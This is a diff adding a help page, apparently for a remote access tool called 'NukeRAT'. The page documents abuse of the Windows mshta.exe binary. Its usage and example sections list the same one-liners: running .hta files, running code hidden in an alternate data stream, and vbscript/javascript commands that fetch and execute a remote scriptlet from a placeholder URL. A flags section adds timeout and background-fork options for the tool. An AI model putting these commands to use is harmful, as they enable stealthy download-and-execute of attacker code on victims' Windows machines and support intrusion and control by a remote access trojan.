@@ -1,0 +1,25 @@
+ABOUT
+    Windows utility to execute html applications. (.hta). LOLBAS
+    covers execute code, execute code hidden in alternate data
+    stream, and related techniques.
+
+USAGE:
+    mshta.exe {PATH:.hta}
+    mshta.exe vbscript:Close(Execute("GetObject(""script:{REMOTEURL:.sct}"")"))
+    mshta.exe javascript:a=GetObject("script:{REMOTEURL:.sct}").Exec();close();
+    mshta.exe "{PATH_ABSOLUTE}:file.hta"
+    mshta.exe {REMOTEURL}
+
+EXAMPLES:
+    mshta.exe {PATH:.hta}
+    mshta.exe vbscript:Close(Execute("GetObject(""script:{REMOTEURL:.sct}"")"))
+    mshta.exe javascript:a=GetObject("script:{REMOTEURL:.sct}").Exec();close();
+    mshta.exe "{PATH_ABSOLUTE}:file.hta"
+    mshta.exe {REMOTEURL}
+
+NUKERAT FLAGS:
+    -w <seconds>    Maximum wait time until timeout
+    -bg             Fork and run without waiting for output
+
+    Example:
+    mshta.exe {PATH:.hta}
